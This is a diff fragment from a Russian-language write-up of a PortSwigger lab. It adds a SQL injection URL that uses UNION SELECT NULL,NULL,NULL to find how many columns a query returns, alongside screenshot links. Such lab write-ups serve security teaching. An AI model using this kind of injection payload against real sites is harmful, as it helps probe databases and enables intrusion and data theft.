@@ -66,7 +66,9 @@ Cуществует два эффективных метода определе�
 ![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_determining_the_number_of_columns_returned_by_the_query/assets/3.png)
 
 При подстановке третьего NULL приложение перестает выдавать ошибку.
-
+```
+/filter?=category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--
+```
 ![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_determining_the_number_of_columns_returned_by_the_query/assets/4.png)
 
 ![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_determining_the_number_of_columns_returned_by_the_query/assets/5.png)
